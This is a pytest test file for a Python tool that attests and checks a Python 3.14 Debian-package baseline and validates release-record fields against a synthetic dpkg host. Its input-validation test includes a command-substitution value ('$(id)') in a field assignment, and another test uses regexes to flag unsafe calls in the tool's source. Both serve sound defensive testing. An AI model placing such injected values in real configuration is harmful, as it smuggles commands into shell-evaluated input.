"""Route 3 release-record tooling (``tools/route3_release_record.py``) for the pre-installed Python 3.14 baseline.

Everything here runs against a *synthetic* host: a private dpkg administrative directory, ``apt-cache``/``dpkg`` shims and a private interpreter file, so no real
package database, apt state or production fact is read. The one test that inspects a real host is gated on the disposable host's identity (``Test``) and skips
elsewhere. The release-side tests build a throw-away git repository, so the archive, manifest and SA-2 recipes are compared with the runbook's literal shell
recipes rather than re-derived.
"""

from __future__ import annotations

import dataclasses
import hashlib
import io
import os
import re
import shutil
import stat
import subprocess
import sys
import tarfile
import tempfile
import textwrap
from pathlib import Path

import pytest

from tools import route3_release_record as rr

REPO = Path(__file__).resolve().parents[1]
RUNBOOK = REPO / "docs/operations/executor-supervisor-provisioning-runbook.md"
TOOL = REPO / "tools/route3_release_record.py"
PYTHON = sys.executable
VERSION = "3.14.4-1ubuntu0.2"
MIRROR = "http://archive.example.test/ubuntu resolute-updates/main"
SECURITY = "http://security.example.test/ubuntu resolute-security/main"


@pytest.fixture(autouse=True)
def _scratch_directory_is_not_setgid(tmp_path):
    """A setgid scratch parent (``TMPDIR`` under a setgid directory) makes every file the tests create carry the directory's group, not the process's, so the synthetic
    packages' recorded owner no longer matches the files and ``dpkg-deb`` refuses a setgid control directory. These tests describe files the process itself owns."""
    tmp_path.chmod(tmp_path.stat().st_mode & ~stat.S_ISGID)


# ---- a synthetic host ----------------------------------------------------------------------------------------------------------------

PACKAGES = {
    # name: (version, arch, source, depends, provides)
    "python3.14": (VERSION, "amd64", "python3.14", "python3.14-minimal (= 3.14.4-1ubuntu0.2), libpython3.14-stdlib (= 3.14.4-1ubuntu0.2)", ""),
    "python3.14-minimal": (VERSION, "amd64", "python3.14", "libpython3.14-minimal (= 3.14.4-1ubuntu0.2), libexpat1 (>= 2.0), libc6 (>= 2.38), zlib1g (>= 1:1.2)", ""),
    "python3.14-venv": (VERSION, "amd64", "python3.14", "python3.14 (= 3.14.4-1ubuntu0.2), python3-pip-whl, python3-setuptools-whl", ""),
    "libpython3.14-minimal": (VERSION, "amd64", "python3.14", "libc6 (>= 2.38)", ""),
    "libpython3.14-stdlib": (VERSION, "amd64", "python3.14", "libpython3.14-minimal (= 3.14.4-1ubuntu0.2), libbz2-1.0, libffi8, media-types | mime-support, awk", ""),
    "python3-pip-whl": ("26.0-1", "all", "python-pip", "", ""),
    "python3-setuptools-whl": ("80.9-1", "all", "setuptools", "", ""),
    "libc6": ("2.43-2ubuntu1", "amd64", "glibc", "libgcc-s1", ""),
    "libgcc-s1": ("16.1-1ubuntu1", "amd64", "gcc-16", "gcc-16-base (= 16.1-1ubuntu1), libc6 (>= 2.35)", ""),
    "gcc-16-base": ("16.1-1ubuntu1", "amd64", "gcc-16", "", ""),
    "libexpat1": ("2.8.0-1", "amd64", "expat", "libc6 (>= 2.38)", ""),
    "zlib1g": ("1:1.3.dfsg-5", "amd64", "zlib", "libc6", ""),
    "libbz2-1.0": ("1.0.8-6", "amd64", "bzip2", "libc6", ""),
    "libffi8": ("3.5.2-1", "amd64", "libffi", "libc6", ""),
    "media-types": ("14.0.0", "all", "media-types", "", ""),
    "mawk": ("1.3.4-1", "amd64", "mawk", "libc6", "awk"),
    "hello": ("2.12-1", "amd64", "hello", "libc6", ""),   # installed, but not in the closure
}
INTERPRETER_BYTES = b"\x7fELF synthetic interpreter 1\n"


def _owner() -> tuple[str, str]:
    """The names the host seam resolves for files this test process creates (the packages' recorded owner, so the comparison is exact without root)."""
    return rr.Host._system_owner_names(os.getuid(), os.getgid())


@dataclasses.dataclass
class Spec:
    """One synthetic package: its control fields, files (path -> (kind, content-or-target, mode)), conffiles and maintainer scripts."""

    name: str
    version: str
    arch: str
    source: str
    depends: str
    provides: str
    files: dict
    conffiles: tuple
    scripts: dict
    variant: str = ""       # an architecture-variant build (for example amd64v3): dpkg still records Architecture amd64

    def control(self) -> str:
        lines = [f"Package: {self.name}", f"Architecture: {self.arch}", f"Version: {self.version}"]
        if self.variant:
            lines.append(f"Architecture-Variant: {self.variant}")
        if self.source != self.name:
            lines.append(f"Source: {self.source} (1.0)")
        if self.depends:
            lines.append(f"Depends: {self.depends}")
        if self.provides:
            lines.append(f"Provides: {self.provides}")
        return "\n".join(lines) + "\n"

    def md5sums(self) -> str:
        return "".join(f"{hashlib.md5(c).hexdigest()}  {p.lstrip('/')}\n" for p, (kind, c, _m) in sorted(self.files.items()) if kind == "file")


def make_spec(name: str, version: str | None = None, interpreter: bytes = INTERPRETER_BYTES, **override) -> Spec:
    v, arch, source, depends, provides = PACKAGES[name]
    version = version or v
    files = {f"/usr/share/{name}/data": ("file", f"{name} {version} data\n".encode(), 0o644), f"/usr/share/{name}/current": ("symlink", "data", 0o777),
             f"/usr/lib/lib{name}.so": ("file", f"{name} {version} library\n".encode(), 0o755), f"/etc/{name}.conf": ("file", f"{name} default\n".encode(), 0o644),
             f"/lib64/ld-{name}.so": ("symlink", f"../lib/lib{name}.so", 0o777)}
    if name == "python3.14-minimal":
        files["/usr/bin/python3.14"] = ("file", interpreter, 0o755)
    spec = Spec(name, version, arch, source, depends, provides, files, (f"/etc/{name}.conf",), {"postinst": f"#!/bin/sh\n# {name} {version}\n"})
    for key, value in override.items():
        setattr(spec, key, value)
    return spec


def make_deb(spec: Spec, compression: str = "xz") -> bytes:
    """A real ``.deb`` (ar of debian-binary, control.tar.<c>, data.tar.<c>) with the synthetic package's content."""
    owner = _owner()

    def tar_of(entries) -> bytes:
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:", format=tarfile.GNU_FORMAT) as tar:
            for name, kind, content, mode in entries:
                info = tarfile.TarInfo(name)
                info.uname, info.gname, info.mode, info.mtime = owner[0], owner[1], mode, 0
                if kind == "dir":
                    info.type = tarfile.DIRTYPE
                    tar.addfile(info)
                elif kind == "symlink":
                    info.type, info.linkname = tarfile.SYMTYPE, content
                    tar.addfile(info)
                else:
                    info.size = len(content)
                    tar.addfile(info, io.BytesIO(content))
        return buf.getvalue()

    def packed(data: bytes) -> tuple[str, bytes]:
        import lzma
        import zlib
        if compression == "xz":
            return ".xz", lzma.compress(data)
        if compression == "gz":
            compressor = zlib.compressobj(wbits=31)
            return ".gz", compressor.compress(data) + compressor.flush()
        return "", data

    control = [("./", "dir", b"", 0o755), ("./control", "file", spec.control().encode(), 0o644), ("./md5sums", "file", spec.md5sums().encode(), 0o644),
               ("./conffiles", "file", "".join(f"{c}\n" for c in spec.conffiles).encode(), 0o644)]
    control += [(f"./{n}", "file", t.encode(), 0o755) for n, t in sorted(spec.scripts.items())]
    dirs = sorted({"/".join(p.split("/")[:i]) for p in spec.files for i in range(2, len(p.split("/")))})
    data = [("./", "dir", b"", 0o755)] + [(f".{d}/", "dir", b"", 0o755) for d in dirs]
    data += [(f".{p}", kind, c if kind != "symlink" else c, m) for p, (kind, c, m) in sorted(spec.files.items())]
    ext_c, body_c = packed(tar_of(control))
    ext_d, body_d = packed(tar_of(data))
    members = [("debian-binary", b"2.0\n"), (f"control.tar{ext_c}", body_c), (f"data.tar{ext_d}", body_d)]
    out = b"!<arch>\n"
    for name, body in members:
        out += f"{name:<16}{0:<12}{0:<6}{0:<6}{'100644':<8}{len(body):<10}`\n".encode() + body + (b"\n" if len(body) & 1 else b"")
    return out


def status_text(overrides: dict | None = None, extra: str = "") -> str:
    out = []
    for name, (version, arch, source, depends, provides) in {**PACKAGES, **(overrides or {})}.items():
        if version is None:
            continue
        lines = [f"Package: {name}", "Status: install ok installed", f"Architecture: {arch}", f"Version: {version}"]
        if source != name:
            lines.append(f"Source: {source} (1.0)")
        if depends:
            lines.append(f"Depends: {depends}")
        if provides:
            lines.append(f"Provides: {provides}")
        lines.append(f"Conffiles:\n /etc/{name}.conf {hashlib.md5(f'{name} default{chr(10)}'.encode()).hexdigest()}")
        out.append("\n".join(lines))
    return "\n\n".join(out) + "\n\n" + extra


class FakeArchive(rr.Archive):
    """The signed archive as the reference generator sees it: an index (SHA-256 and origins per package) and the package files."""

    def __init__(self, debs: dict, origins: tuple = (MIRROR,), index: dict | None = None) -> None:
        self.debs, self.origins, self.stated = debs, origins, index or {}

    def index(self, name, version, arch, cwd):
        return self.stated.get(name) or hashlib.sha256(self.debs[name]).hexdigest(), self.origins

    def fetch(self, name, version, directory):
        path = directory / f"{name}_{version.replace(':', '%3a')}_amd64.deb"
        path.write_bytes(self.debs[name])
        return path


class SyntheticHost:
    def __init__(self, root: Path) -> None:
        self.root = root
        self.admin = root / "dpkg"
        self.bin = root / "bin"
        self.data = root / "data"
        self.sys = root / "sys"
        for d in (self.admin / "info", self.bin, self.data / "madison", self.data / "verify", self.sys / "usr/bin", self.sys / "etc/dpkg/dpkg.cfg.d"):
            d.mkdir(parents=True)
        (self.sys / "usr/lib64").mkdir()
        (self.sys / "lib64").symlink_to("usr/lib64")      # a merged-/usr host: /lib64 is an alias of /usr/lib64, which the packages still name as /lib64
        self.interpreter = self.sys / "usr/bin/python3.14"
        self.os_release = root / "os-release"
        self.os_release.write_text('ID=ubuntu\nVERSION_ID="26.04"\nVERSION_CODENAME=resolute\n')
        (self.admin / "status").write_text(status_text())
        self.specs = {name: make_spec(name) for name in PACKAGES}
        for spec in self.specs.values():
            self.install(spec)
        for name, (version, *_rest) in PACKAGES.items():
            self.offer(name, version, MIRROR)
        (self.bin / "apt-cache").write_text(f'#!/bin/sh\n[ "$1" = madison ] && cat "{self.data}/madison/$2" 2>/dev/null; exit 0\n')
        (self.bin / "dpkg").write_text(textwrap.dedent(f'''\
            #!/bin/sh
            rc=0
            while [ $# -gt 0 ]; do
              case "$1" in
                --admindir) shift 2;;
                --*) shift;;
                *) [ -s "{self.data}/verify/$1" ] && {{ cat "{self.data}/verify/$1"; rc=1; }}; shift;;
              esac
            done
            exit $rc
            '''))
        # dpkg-query -W -f='${Version}' NAME: the version of an installed package from the synthetic status file, status 1 when it is not installed
        (self.bin / "dpkg-query").write_text(textwrap.dedent(f'''\
            #!/bin/sh
            for last; do :; done
            case "$last" in -f*) awk -F': ' '$1 == "Package" {{ n = $2 }} $1 == "Version" {{ printf "%s\\t%s\\n", n, $2 }}' "{self.admin}/status"; exit 0;; esac
            v=$(awk -v n="$last" '$1 == "Package:" {{ f = ($2 == n) }} f && $1 == "Version:" {{ print $2; exit }}' "{self.admin}/status")
            [ -n "$v" ] || exit 1
            printf '%s' "$v"
            '''))
        for tool in ("apt-cache", "dpkg", "dpkg-query"):
            (self.bin / tool).chmod(0o755)

    # -- installing a synthetic package onto the private root, exactly as dpkg would leave it
    def install(self, spec: Spec) -> None:
        listing = ["/."]
        for d in sorted({"/".join(p.split("/")[:i]) for p in spec.files for i in range(2, len(p.split("/")))}):
            listing.append(d)
            (self.sys / d.lstrip("/")).mkdir(parents=True, exist_ok=True)
        for path, (kind, content, mode) in sorted(spec.files.items()):
            target = self.sys / path.lstrip("/")
            target.parent.mkdir(parents=True, exist_ok=True)
            if target.is_symlink() or target.exists():
                target.unlink()
            if kind == "symlink":
                target.symlink_to(content)
            else:
                target.write_bytes(content)
                target.chmod(mode)
            listing.append(path)
        info = self.admin / "info"
        (info / f"{spec.name}.list").write_text("\n".join(listing) + "\n")
        (info / f"{spec.name}.md5sums").write_text(spec.md5sums())
        (info / f"{spec.name}.conffiles").write_text("".join(f"{c}\n" for c in spec.conffiles))
        for name, text in spec.scripts.items():
            (info / f"{spec.name}.{name}").write_text(text)

    def label_installed_as(self, name: str, variant: str) -> None:
        """What dpkg records for a variant build: the same Architecture as the plain build plus an ``Architecture-Variant`` field in the status database."""
        path = self.admin / "status"
        text = path.read_text()
        anchor = f"Package: {name}\nStatus: install ok installed\nArchitecture: {self.specs[name].arch}\n"
        assert anchor in text
        path.write_text(text.replace(anchor, anchor + f"Architecture-Variant: {variant}\n", 1))
        self.specs[name] = dataclasses.replace(self.specs[name], variant=variant)

    def make_variant(self, name: str, variant: str = "amd64v3", rebuilt_files: bool = True) -> None:
        """Install ``name`` as the variant build: labelled in the status database and (as a real variant is) with different bytes in its libraries; the interpreter file keeps the accepted bytes."""
        spec = self.specs[name]
        if rebuilt_files:
            library = f"/usr/lib/lib{name}.so"
            spec = dataclasses.replace(spec, files={**spec.files, library: ("file", f"{name} {spec.version} library built for {variant}\n".encode(), 0o755)})
            self.specs[name] = spec
            self.install(spec)
        self.label_installed_as(name, variant)

    def set_interpreter(self, content: bytes) -> None:
        """A legitimate interpreter: the installed file AND the archive's package carry it."""
        self.specs["python3.14-minimal"] = make_spec("python3.14-minimal", interpreter=content)
        self.install(self.specs["python3.14-minimal"])

    def archive(self, **kw) -> FakeArchive:
        return FakeArchive({name: make_deb(spec, "none") for name, spec in self.specs.items()}, **kw)

    def reference(self, record: "rr.Baseline | None" = None, **kw) -> tuple[str, str]:
        """(baseline record text, payload reference text) for the host as it is now, derived from the pristine archive packages."""
        record = record or rr.attest(self.host())
        text = record.render()
        return text, rr.build_reference(rr.Baseline.parse(text), text, self.root / f"ref{len(list(self.root.glob('ref*')))}", self.archive(**kw)).render()

    def offer(self, name: str, version: str, *sources: str, append: bool = False) -> None:
        text = "".join(f" {name} | {version} | {s} amd64 Packages\n" for s in sources)
        path = self.data / "madison" / name
        path.write_text((path.read_text() if append else "") + text)

    def status(self, overrides: dict | None = None, extra: str = "") -> None:
        (self.admin / "status").write_text(status_text(overrides, extra))

    def flags(self) -> list[str]:
        return ["--admindir", str(self.admin), "--bin-dir", str(self.bin), "--interpreter", "/usr/bin/python3.14", "--os-release", str(self.os_release), "--root", str(self.sys)]

    def host(self) -> rr.Host:
        return rr.Host(self.admin, self.bin, Path("/usr/bin/python3.14"), self.os_release, root=self.sys)

    def cli(self, *args: str) -> subprocess.CompletedProcess:
        return subprocess.run([PYTHON, "-I", "-S", "-B", str(TOOL), *args], capture_output=True, text=True, check=False, cwd="/", env={"PATH": "/usr/bin:/bin"})


@pytest.fixture
def host(tmp_path):
    return SyntheticHost(tmp_path)


# ---- attestation ---------------------------------------------------------------------------------------------------------------------

def test_attestation_is_the_deterministic_closure_of_the_three_roots_with_pinned_and_base_classes(host):
    first = rr.attest(host.host())
    again = rr.attest(host.host())
    assert first.render() == again.render() and first.render().endswith("\n")
    names = {m.name for m in first.members}
    assert "hello" not in names and {"python3.14", "python3.14-minimal", "python3.14-venv", "libc6", "libgcc-s1", "mawk", "media-types"} <= names, "Provides and alternatives are followed, strangers are not"
    assert "mime-support" not in names, "an alternative that is not installed is not part of the closure"
    assert {m.name for m in first.of("pin")} == {"python3.14", "python3.14-minimal", "python3.14-venv", "libpython3.14-minimal", "libpython3.14-stdlib"}
    assert all(m.source != "python3.14" for m in first.of("base"))
    assert first.interpreter_sha256 == hashlib.sha256(host.interpreter.read_bytes()).hexdigest()
    assert rr.Baseline.parse(first.render()) == first
    assert first.tokens("pin").startswith("libpython3.14-minimal=3.14.4-1ubuntu0.2 ")


def test_a_noncanonical_or_inconsistent_record_is_refused(host):
    text = rr.attest(host.host()).render()
    rows = text.split("\n")
    pkg_rows = [i for i, r in enumerate(rows) if r.startswith("pkg\t")]
    swapped = rows[:]
    swapped[pkg_rows[0]], swapped[pkg_rows[1]] = swapped[pkg_rows[1]], swapped[pkg_rows[0]]
    for label, bad in (("order", "\n".join(swapped)), ("trailing space", text.replace("\tamd64\t", "\tamd64 \t", 1)), ("count", text.replace("\nend\t", "\nend\t9")),
                       ("no final newline", text.rstrip("\n")), ("header", text.replace(rr.RECORD_HEADER, "route3-baseline-record 2")), ("class", text.replace("pkg\tpin\t", "pkg\tpinned\t", 1)),
                       ("roots", text.replace("root\tpython3.14-venv\n", "")), ("empty", "")):
        with pytest.raises(rr.RecordError):
            rr.Baseline.parse(bad)


@pytest.mark.parametrize("label", ["unsatisfied dependency", "half installed", "root missing", "multiarch duplicate", "wanted removal", "locally built", "unknown source shape",
                                   "foreign interpreter", "interpreter symlink to foreign file"])
def test_attestation_refuses_what_it_cannot_prove(host, label):
    if label == "unsatisfied dependency":
        host.status({"libffi8": (None, "", "", "", "")})
    elif label == "half installed":
        host.status(extra="Package: zzz\nStatus: install ok half-configured\nArchitecture: amd64\nVersion: 1\n\n")
    elif label == "root missing":
        host.status({"python3.14-venv": (None, "", "", "", "")})
    elif label == "multiarch duplicate":
        host.status(extra="Package: libffi8\nStatus: install ok installed\nArchitecture: i386\nVersion: 3.5.2-1\n\n")
    elif label == "wanted removal":
        (host.admin / "status").write_text(status_text().replace("Package: libffi8\nStatus: install ok installed", "Package: libffi8\nStatus: deinstall ok installed"))
    elif label == "locally built":   # only dpkg's own status file "offers" it: no archive, so no provenance
        host.offer("libffi8", "3.5.2-1", rr.DPKG_STATUS_PSEUDO_SOURCE)
    elif label == "unknown source shape":
        host.offer("libffi8", "3.5.2-1", "ftp://x.test/ubuntu a/b", append=True)
    elif label == "foreign interpreter":
        (host.admin / "info" / "python3.14-minimal.list").write_text("/usr/bin/python3.13\n")
    elif label == "interpreter symlink to foreign file":
        (host.admin / "info" / "python3.14-minimal.list").write_text("/usr/bin/python3.14\n")
        other = host.sys / "elsewhere"
        other.write_bytes(b"x")
        host.interpreter.unlink()
        host.interpreter.symlink_to(other)
    with pytest.raises(rr.RecordError):
        rr.attest(host.host())


def test_the_dpkg_status_pseudo_source_is_the_installed_marker_not_an_origin(host):
    host.offer("libffi8", "3.5.2-1", rr.DPKG_STATUS_PSEUDO_SOURCE, append=True)
    member = next(m for m in rr.attest(host.host()).members if m.name == "libffi8")
    assert member.origins == (MIRROR,)


def test_an_origin_allow_list_rejects_a_stray_source_and_accepts_the_listed_ones(host):
    host.offer("libffi8", "3.5.2-1", SECURITY, append=True)
    assert rr.attest(host.host(), [MIRROR, SECURITY])
    with pytest.raises(rr.RecordError, match="not allowed"):
        rr.attest(host.host(), [MIRROR])


# ---- drift ---------------------------------------------------------------------------------------------------------------------------

def reviewed(host) -> rr.Baseline:
    return rr.Baseline.parse(rr.attest(host.host()).render())


def drift(host, record: rr.Baseline) -> list[str]:
    return rr.compare(record, rr.attest(host.host())) + rr.verify_files(host.host(), record)


def test_an_unchanged_host_has_no_drift(host):
    assert drift(host, reviewed(host)) == []


def test_a_pinned_package_update_is_pinned_drift(host):
    record = reviewed(host)
    host.status({"python3.14": ("3.14.4-1ubuntu0.3", "amd64", "python3.14", PACKAGES["python3.14"][3], "")})
    host.offer("python3.14", "3.14.4-1ubuntu0.3", MIRROR)
    assert any("pinned drift: python3.14 version" in f for f in drift(host, record))


def test_drift_findings_name_base_pinned_closure_origin_interpreter_and_files(host):
    record = reviewed(host)
    # a base library update
    host.status({"libc6": ("2.43-3", "amd64", "glibc", "libgcc-s1", "")})
    host.offer("libc6", "2.43-3", MIRROR, append=True)
    assert any(f.startswith("base drift: libc6 version reviewed 2.43-2ubuntu1, host 2.43-3") for f in drift(host, record))
    # a new dependency, then a removed one: the closure itself changed
    host.status({"libc6": ("2.43-2ubuntu1", "amd64", "glibc", "libgcc-s1, libnew1", ""), "libnew1": ("1", "amd64", "new", "", "")})
    host.offer("libnew1", "1", MIRROR)
    assert any("unexpected closure: libnew1 is now part" in f for f in drift(host, record))
    host.status({"libexpat1": ("2.8.0-1", "amd64", "expat", "", ""), "python3.14-minimal": (VERSION, "amd64", "python3.14", PACKAGES["python3.14-minimal"][3].replace("libexpat1 (>= 2.0), ", ""), "")})
    assert any("unexpected closure: libexpat1 is no longer part" in f for f in drift(host, record))
    host.status()
    # an origin that was never reviewed offers the pinned version
    host.offer("python3.14-minimal", VERSION, "http://ppa.example.test/ubuntu x/main", append=True)
    assert any("provenance drift" in f and "ppa.example.test" in f for f in drift(host, record))
    host.offer("python3.14-minimal", VERSION, MIRROR)
    # a different interpreter file
    host.interpreter.write_bytes(b"tampered")
    assert any("interpreter SHA-256 drifted" in f for f in drift(host, record))
    host.interpreter.write_bytes(INTERPRETER_BYTES)
    # a changed pinned file, and a changed non-conffile in a base package, are findings; a local conffile edit in a base package is host policy
    (host.data / "verify" / "python3.14-minimal").write_text("??5??????   /usr/bin/python3.14\n")
    assert any("changed packaged file (pin set)" in f for f in drift(host, record))
    (host.data / "verify" / "python3.14-minimal").write_text("")
    (host.data / "verify" / "libc6").write_text("??5?????? c /etc/ld.so.conf\n")
    assert drift(host, record) == []
    (host.data / "verify" / "libc6").write_text("??5??????   /usr/lib/libc.so.6\n")
    assert any("changed packaged file (base set)" in f for f in drift(host, record))


def test_a_failing_verifier_without_output_is_a_finding_not_silence(host):
    (host.bin / "dpkg").write_text("#!/bin/sh\nexit 2\n")
    assert any("dpkg --verify failed" in f for f in rr.verify_files(host.host(), reviewed(host)))


# ---- the command line ----------------------------------------------------------------------------------------------------------------

def test_cli_attest_then_verify_passes_and_every_drift_exits_one(host, tmp_path):
    record = tmp_path / "baseline.record"
    done = host.cli("attest-host", *host.flags())
    assert done.returncode == 0 and done.stdout.startswith(rr.RECORD_HEADER), done
    record.write_text(done.stdout)
    text, reference_text = host.reference()
    assert text == done.stdout
    reference = tmp_path / "reference.record"
    reference.write_text(reference_text)
    ok = host.cli("verify-host", "--record", str(record), "--reference", str(reference), *host.flags())
    assert ok.returncode == 0 and ok.stdout.startswith("ok:"), ok
    host.status({"libffi8": ("3.5.3-1", "amd64", "libffi", "libc6", "")})
    host.offer("libffi8", "3.5.3-1", MIRROR)
    bad = host.cli("verify-host", "--record", str(record), "--reference", str(reference), *host.flags())
    assert bad.returncode == 1 and "NO-GO: base drift: libffi8 version" in bad.stdout, bad
    assert host.cli("verify-host", "--record", str(record), *host.flags()).returncode == 2, "the payload reference is not optional"


def test_cli_exit_codes_distinguish_environment_from_findings_and_usage(host, tmp_path):
    (host.admin / "status").unlink()
    gone = host.cli("attest-host", *host.flags())
    assert gone.returncode == 3 and "ENVIRONMENT" in gone.stderr and gone.stdout == ""
    host.status()
    reference = tmp_path / "reference.record"
    reference.write_text("x\n")
    assert host.cli("verify-host", "--record", str(tmp_path / "missing"), "--reference", str(reference), *host.flags()).returncode == 3
    assert host.cli("verify-host", "--record", str(tmp_path), "--reference", str(reference), *host.flags()).returncode == 3
    assert host.cli("no-such-command").returncode == 2
    (tmp_path / "junk").write_text("not a record\n")
    assert host.cli("verify-host", "--record", str(tmp_path / "junk"), "--reference", str(reference), *host.flags()).returncode == 1


def test_the_attestation_never_writes_to_the_host_it_reads(host, tmp_path):
    def snapshot(root):
        return {str(p.relative_to(root)): (p.stat().st_mtime_ns, p.read_bytes() if p.is_file() else b"") for p in sorted(root.rglob("*"))}
    before = snapshot(host.root)
    assert host.cli("attest-host", *host.flags()).returncode == 0
    assert snapshot(host.root) == before


def test_the_tool_runs_isolated_with_the_standard_library_only():
    imports = set(re.findall(r"^(?:import|from) ([a-z_]+)", TOOL.read_text(), re.M))
    assert imports <= {"argparse", "dataclasses", "grp", "hashlib", "io", "lzma", "os", "pwd", "re", "stat", "subprocess", "sys", "tarfile", "tempfile", "zlib", "collections", "pathlib", "__future__"}, imports
    text = TOOL.read_text()
    assert not re.search(r"\b(shell=True|os\.system|eval\(|exec\()", text)
    assert not re.search(r"(apt-get (install|remove|update|upgrade)|apt-mark|dpkg -i|--purge)", text)
    assert not re.search(r"subprocess\.run\(\[[^\]]*\"(install|remove|purge|upgrade|hold|unhold|update)\"", text), "no subprocess argument vector is a package mutation"
    assert text.count("/usr/bin/apt-get") == 2 and text.count('"/usr/bin/apt-get", "download"') == 2, "the only apt-get uses are the off-production package downloads"


# ---- release record: block F ---------------------------------------------------------------------------------------------------------

GOOD = {"RELEASE_REV": "b" * 40, "ARCHIVE_SHA256": "c" * 64, "MANIFEST_SHA256": "d" * 64, "APT_PACKAGES": "", "APT_BASE": "", "APT_ORIGIN": MIRROR, "PY_SHA256": "e" * 64,
        "BASELINE_SHA256": "a" * 64, "REFERENCE_SHA256": "9" * 64, "SA2_TREE_SHA256": "f" * 64, "WHEEL": rr.WHEEL_NAME, "WHEEL_SHA256": rr.WHEEL_SHA256}


def good_fields(host=None) -> tuple[dict[str, str], str]:
    return dict(GOOD), ""


def bound_fields(host) -> tuple[dict[str, str], str]:
    """(fields, baseline record text); the payload reference text is ``bound_reference(host, fields)``."""
    text, reference = host.reference()
    record = rr.Baseline.parse(text)
    fields = {**GOOD, "APT_PACKAGES": record.tokens("pin"), "APT_BASE": record.tokens("base"), "APT_ORIGIN": record.origin_list(), "PY_SHA256": record.interpreter_sha256,
              "BASELINE_SHA256": rr.sha256_bytes(text.encode()), "REFERENCE_SHA256": rr.sha256_bytes(reference.encode())}
    host.last_reference = reference
    return fields, text


def test_the_committed_runbook_block_f_is_read_strictly_and_every_unset_is_a_finding():
    fields = rr.read_fields(RUNBOOK.read_text())
    assert set(fields) == set(rr.FIELD_KEYS)
    # until a reviewed record is supplied the live block must refuse; once it is supplied this asserts completeness instead
    findings = rr.validate_fields(fields)
    if any(v == "UNSET" for v in fields.values()):
        assert len([f for f in findings if "UNSET" in f]) == len([k for k, v in fields.items() if "UNSET" in v])
    else:
        assert findings == []


def test_a_good_record_binds_to_the_baseline_and_each_tampered_field_is_refused(host):
    fields, text = bound_fields(host)
    reference = host.last_reference
    pinned = fields["APT_PACKAGES"].split()
    base = fields["APT_BASE"].split()
    assert fields["APT_PACKAGES"].split()[0].startswith("libpython3.14-minimal=") and rr.validate_fields({**GOOD, **fields}, text, reference) == []
    # the fields alone (without the record) are checked for form, with it for substance
    assert rr.validate_fields(fields) == []
    for key, bad in (("APT_PACKAGES", " ".join(pinned[:-1])), ("APT_PACKAGES", " ".join(pinned + ["libextra=1"])), ("APT_BASE", " ".join(base[:-1])),
                     ("APT_BASE", " ".join([*base, "libc6=2.43-2ubuntu1"])), ("APT_ORIGIN", f"{MIRROR}, {SECURITY}"), ("PY_SHA256", "9" * 64), ("BASELINE_SHA256", "9" * 64),
                     ("REFERENCE_SHA256", "8" * 64)):
        findings = rr.validate_fields({**fields, key: bad}, text, reference)
        assert findings, (key, bad)
    assert rr.validate_fields(fields, text.replace("\tamd64\t", "\tamd64v3\t", 1), reference), "a record that does not hash to the field is refused"
    assert any("payload reference is required" in f for f in rr.validate_fields(fields, text)), "the record cannot be bound without the signed-archive reference"
    assert rr.validate_fields(fields, text, reference.replace("pkg\t", "pkg\t", 1) + " "), "a reference that does not hash to the field is refused"


@pytest.mark.parametrize("key,bad", [
    ("RELEASE_REV", "abc"), ("RELEASE_REV", "B" * 40), ("RELEASE_REV", "UNSET"), ("ARCHIVE_SHA256", "G" * 64), ("MANIFEST_SHA256", "c" * 63), ("PY_SHA256", "UNSET"),
    ("BASELINE_SHA256", "UNSET"), ("REFERENCE_SHA256", "UNSET"), ("REFERENCE_SHA256", "9" * 65), ("SA2_TREE_SHA256", "f" * 65), ("APT_PACKAGES", "UNSET"), ("APT_BASE", "UNSET"), ("APT_ORIGIN", "UNSET"), ("APT_BASE", ""),
    ("APT_PACKAGES", "python3.14-minimal=1"), ("APT_PACKAGES", "python3.14=1 python3.14-minimal=1 python3.14-venv"), ("APT_PACKAGES", "python3.14=1 python3.14-minimal=1 python3.14-venv=1 libx=1 libx=2"),
    ("APT_PACKAGES", "python3.14=1  python3.14-minimal=1 python3.14-venv=1"),
    ("APT_BASE", "libc6=1 libc6=2"), ("APT_BASE", "libc6"), ("APT_BASE", "python3.14=1"),
    ("APT_ORIGIN", "resolute-updates"), ("APT_ORIGIN", f"{SECURITY}, {MIRROR}"), ("APT_ORIGIN", f"{MIRROR}, {MIRROR}"), ("APT_ORIGIN", "ftp://x.test/ubuntu a/b"),
    ("WHEEL", "evil-1.0-py3-none-any.whl"), ("WHEEL_SHA256", "0" * 64)])
def test_malformed_unset_or_unaccepted_fields_are_refused(key, bad):
    base = {**GOOD, "APT_PACKAGES": "python3.14=1 python3.14-minimal=1 python3.14-venv=1 libpython3.14-minimal=1", "APT_BASE": "libc6=1"}
    assert rr.validate_fields(base) == [], "the control passes"
    assert rr.validate_fields({**base, key: bad}), (key, bad)


def test_a_missing_or_unknown_field_is_refused():
    base = {**GOOD, "APT_PACKAGES": "python3.14=1 python3.14-minimal=1 python3.14-venv=1", "APT_BASE": "libc6=1"}
    assert rr.validate_fields({k: v for k, v in base.items() if k != "APT_BASE"}) == ["ROUTE3_APT_BASE is missing"]
    block = "```bash\nROUTE3_RELEASE_REV=UNSET\nROUTE3_EXTRA=1\n```\n"
    with pytest.raises(rr.RecordError):
        rr.read_fields(block)
    with pytest.raises(rr.RecordError):
        rr.read_fields("```bash\nROUTE3_RELEASE_REV=UNSET\nROUTE3_RELEASE_REV=UNSET\n```\n")
    with pytest.raises(rr.RecordError):
        rr.read_fields('```bash\nROUTE3_RELEASE_REV="$(id)"\n```\n')
    with pytest.raises(rr.RecordError):
        rr.read_fields("no block here")


def runbook_blocks() -> list[str]:
    return re.findall(r"```bash\n(.*?)\n```", RUNBOOK.read_text(), re.S)


def shell_accepts(fields: dict[str, str]) -> bool:
    """Run the runbook's own ``route3_fields_ok`` (S0.1) on these values."""
    definitions = next(b for b in runbook_blocks() if b.startswith("ROUTE3_PATH="))
    assigns = "\n".join(f'ROUTE3_{k}="{v}"' for k, v in fields.items())
    done = subprocess.run(["/bin/bash", "-c", f"{definitions}\n{assigns}\nroute3_fields_ok"], capture_output=True, text=True, env={"PATH": "/usr/bin:/bin"}, check=False)
    return done.returncode == 0


def test_the_shell_gate_and_the_tool_accept_and_refuse_the_same_records():
    good = {**GOOD, "APT_PACKAGES": "python3.14=1 python3.14-minimal=1 python3.14-venv=1 libpython3.14-minimal=1", "APT_BASE": "libc6=1 libgcc-s1=2"}
    assert shell_accepts(good) and rr.validate_fields(good) == []
